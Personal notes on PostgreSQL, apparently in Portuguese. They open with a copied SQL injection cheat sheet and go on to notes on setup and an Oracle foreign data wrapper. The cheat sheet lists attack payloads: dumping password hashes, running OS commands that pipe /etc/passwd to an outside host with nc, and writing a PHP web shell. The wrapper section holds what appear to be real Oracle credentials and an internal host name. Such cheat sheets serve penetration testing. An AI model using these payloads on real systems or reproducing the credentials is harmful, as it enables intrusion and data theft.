
http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet

<table border="1">
<tbody>
<tr>
<td>Version</td>
<td>SELECT version()</td>
</tr>
<tr>
<td>Comments</td>
<td>SELECT 1; –comment<br>
SELECT /*comment*/1;</td>
</tr>
<tr>
<td>Current User</td>
<td>SELECT user;<br>
SELECT current_user;<br>
SELECT session_user;<br>
SELECT usename FROM pg_user;<br>
SELECT getpgusername();</td>
</tr>
<tr>
<td>List Users</td>
<td>SELECT usename FROM pg_user</td>
</tr>
<tr>
<td>List Password Hashes</td>
<td>SELECT usename, passwd FROM pg_shadow — priv</td>
</tr>
<tr>
<td>Password Cracker</td>
<td><a href="http://pentestmonkey.net/blog/cracking-postgres-hashes/">MDCrack</a> can crack PostgreSQL’s MD5-based passwords.</td>
</tr>
<tr>
<td>List Privileges</td>
<td>SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user</td>
</tr>
<tr>
<td>List DBA Accounts</td>
<td>SELECT usename FROM pg_user WHERE usesuper IS TRUE</td>
</tr>
<tr>
<td>Current Database</td>
<td>SELECT current_database()</td>
</tr>
<tr>
<td>List Databases</td>
<td>SELECT datname FROM pg_database</td>
</tr>
<tr>
<td>List Columns</td>
<td>SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=’r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum&gt;0) AND (NOT A.attisdropped) AND (N.nspname ILIKE ‘public’)</td>
</tr>
<tr>
<td>List Tables</td>
<td>SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN (‘r’,”) AND n.nspname NOT IN (‘pg_catalog’, ‘pg_toast’) AND pg_catalog.pg_table_is_visible(c.oid)</td>
</tr>
<tr>
<td>Find Tables From Column Name</td>
<td>If you want to list all the table names that contain a column LIKE ‘%password%’:SELECT DISTINCT relname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=’r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum&gt;0) AND (NOT A.attisdropped) AND (N.nspname ILIKE ‘public’) AND attname LIKE ‘%password%’;</td>
</tr>
<tr>
<td>Select Nth Row</td>
<td>SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 0; — rows numbered from 0<br>
SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 1;</td>
</tr>
<tr>
<td>Select Nth Char</td>
<td>SELECT substr(‘abcd’, 3, 1); — returns c</td>
</tr>
<tr>
<td>Bitwise AND</td>
<td>SELECT 6 &amp; 2; — returns 2<br>
SELECT 6 &amp; 1; –returns 0</td>
</tr>
<tr>
<td>ASCII Value -&gt; Char</td>
<td>SELECT chr(65);</td>
</tr>
<tr>
<td>Char -&gt; ASCII Value</td>
<td>SELECT ascii(‘A’);</td>
</tr>
<tr>
<td>Casting</td>
<td>SELECT CAST(1 as varchar);<br>
SELECT CAST(’1′ as int);</td>
</tr>
<tr>
<td>String Concatenation</td>
<td>SELECT ‘A’ || ‘B’; — returnsAB</td>
</tr>
<tr>
<td>If Statement</td>
<td>IF statements only seem valid inside functions, so aren’t much use for SQL injection.&nbsp; See CASE statement instead.</td>
</tr>
<tr>
<td>Case Statement</td>
<td>SELECT CASE WHEN (1=1) THEN ‘A’ ELSE ‘B’ END; — returns A</td>
</tr>
<tr>
<td>Avoiding Quotes</td>
<td>SELECT CHR(65)||CHR(66); — returns AB</td>
</tr>
<tr>
<td>Time Delay</td>
<td>SELECT pg_sleep(10); — postgres 8.2+ only<br>
CREATE OR REPLACE FUNCTION sleep(int) RETURNS int AS ‘/lib/libc.so.6′, ‘sleep’ language ‘C’ STRICT; SELECT sleep(10); –priv, create your own sleep function.&nbsp; Taken from <a href="http://www.portcullis.co.uk/uplds/whitepapers/Having_Fun_With_PostgreSQL.pdf">here</a> .</td>
</tr>
<tr>
<td>Make DNS Requests</td>
<td>Generally not possible in postgres.&nbsp; However if <a href="http://www.leidecker.info/pgshell/Having_Fun_With_PostgreSQL.html">contrib/dblink</a>is installed (it isn’t by default) it can be used to resolve hostnames (assuming you have DBA rights):<p></p>
<pre>SELECT * FROM dblink('host=put.your.hostname.here user=someuser  dbname=somedb', 'SELECT version()') RETURNS (result TEXT);</pre>
<p>Alternatively, if you have DBA rights you could run an OS-level command (see below) to resolve hostnames, e.g. “ping pentestmonkey.net”.</p></td>
</tr>
<tr>
<td>Command Execution</td>
<td>CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS ‘/lib/libc.so.6′, ‘system’ LANGUAGE ‘C’ STRICT; — privSELECT system(‘cat /etc/passwd | nc 10.0.0.1 8080′); — priv, commands run as postgres/pgsql OS-level user</td>
</tr>
<tr>
<td>Local File Access</td>
<td>CREATE TABLE mydata(t text);<br>
COPY mydata FROM ‘/etc/passwd’; — priv, can read files which are readable by postgres OS-level user<br>
…’ UNION ALL SELECT t FROM mydata LIMIT 1 OFFSET 1; — get data back one row at a time<br>
…’ UNION ALL SELECT t FROM mydata LIMIT 1 OFFSET 2; — get data back one row at a time …<br>
DROP TABLE mytest mytest;Write to a file:<p></p>
<p>CREATE TABLE mytable (mycol text);<br>
INSERT INTO mytable(mycol) VALUES (‘&lt;? pasthru($_GET[cmd]); ?&gt;’);<br>
COPY mytable (mycol) TO ‘/tmp/test.php’; –priv, write files as postgres OS-level user.&nbsp; Generally you won’t be able to write to the web root, but it’s always work a try.<br>
– priv user can also read/write files by <a href="http://www.portcullis.co.uk/uplds/whitepapers/Having_Fun_With_PostgreSQL.pdf">mapping libc functions</a></p></td>
</tr>
<tr>
<td>Hostname, IP Address</td>
<td>SELECT inet_server_addr(); — returns db server IP address (or null if using local connection)<br>
SELECT inet_server_port(); — returns db server IP address (or null if using local connection)</td>
</tr>
<tr>
<td>Create Users</td>
<td>CREATE USER test1 PASSWORD ‘pass1′; — priv<br>
CREATE USER test1 PASSWORD ‘pass1′ CREATEUSER; — priv, grant some privs at the same time</td>
</tr>
<tr>
<td>Drop Users</td>
<td>DROP USER test1; — priv</td>
</tr>
<tr>
<td>Make User DBA</td>
<td>ALTER USER test1 CREATEUSER CREATEDB; — priv</td>
</tr>
<tr>
<td>&nbsp;Location of DB files</td>
<td>SELECT current_setting(‘data_directory’); — priv<br>
SELECT current_setting(‘hba_file’); — priv</td>
</tr>
<tr>
<td>Default/System Databases</td>
<td>template0<br>
template1</td>
</tr>
</tbody>
</table>


# Instalação do Zero (windows) com o Super Usuario
`initdb.exe -U postgres -W -D D:\caminho\da\pasta\do\BD`

# Iniciar/Parar o banco 

`pg_ctl -D /pasta/de/dados -l logfile start`

`pg_ctl -D /pasta/de/dados -l logfile stop`


# FDW

FDW (Foreign Data Wrapper) é uma funcionalidade do PostgreSQL que permite acessar dados armazenados em fontes externas como se fossem tabelas locais dentro do banco de dados. Ele fornece uma maneira de estender o PostgreSQL para se conectar e consultar dados em sistemas de bancos de dados externos, como outros bancos de dados PostgreSQL, bancos de dados MySQL, Oracle, SQL Server, APIs REST, arquivos CSV, entre outros.

Ao configurar um FDW, é possível criar tabelas estrangeiras que fazem referência a esses dados externos, permitindo que consultas sejam realizadas em diferentes fontes de dados sem a necessidade de migração ou duplicação dos dados para o banco de dados PostgreSQL.

Essa funcionalidade é útil em casos de integração de dados, consolidação de informações distribuídas em diferentes sistemas, migração de dados ou mesmo para realizar consultas federadas em várias fontes de dados simultaneamente. O PostgreSQL fornece vários FDWs integrados e também permite a criação de FDWs personalizados, oferecendo flexibilidade para acessar e manipular dados de várias origens em um ambiente centralizado.

```sql
--- instalacao ---
--- Tutorial https://www.enterprisedb.com/postgres-tutorials/using-foreign-data-wrappers-access-remote-postgresql-and-oracle-databases
--- https://github.com/laurenz/oracle_fdw/releases/tag/ORACLE_FDW_2_5_0
CREATE EXTENSION oracle_fdw;
ALTER EXTENSION oracle_fdw UPDATE;
SELECT name, default_version, installed_version FROM pg_available_extensions;

--- Criando uma conexão com um banco Oracle
CREATE SERVER ORC_ORA
FOREIGN DATA WRAPPER oracle_fdw 
OPTIONS (dbserver '//dbmira.copel.nt:1521/mira');

-- drop server ORC_ORA CASCADE;

CREATE USER MAPPING FOR postgres
SERVER ORC_ORA
OPTIONS (user 'admorc', password 'inicio');

--- testando a conexão?
--- Adicione no PATH o caminho aonde esta o oci.dll (64bits)

--- criando e importando schema para o sistema ORC
create SCHEMA orc;
create SCHEMA srh;
---drop schema orc cascade;
---drop schema srh cascade;

IMPORT FOREIGN schema "ORC" from server ORC_ORA into "orc";
IMPORT FOREIGN schema "SRH" from server ORC_ORA into "srh";


--- problema de "FROM dual" do oracle
CREATE FOREIGN TABLE orc.dual (
    dummy VARCHAR(1)
)
SERVER ORC_ORA
OPTIONS (
    table 'DUAL'
);

SELECT 'hello world' FROM dual;

--- database info
SELECT datname, pg_encoding_to_char(encoding), datcollate, datctype FROM pg_database WHERE datname='postgres';
```
# Mais

* https://www.enterprisedb.com/blog/the-complete-oracle-to-postgresql-migration-guide-tutorial-move-convert-database-oracle-alternative